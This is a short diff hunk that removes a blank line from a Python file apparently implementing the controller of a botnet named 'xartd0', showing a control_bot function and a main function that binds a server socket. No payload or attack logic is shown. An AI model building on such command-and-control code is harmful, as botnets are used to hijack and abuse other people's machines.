@@ -29,7 +29,6 @@ def control_bot(socks):
         exit()
 
 
-
 def main():
     print('» xartd0 botnet')
     s.bind((HOST_SERVER, PORT))
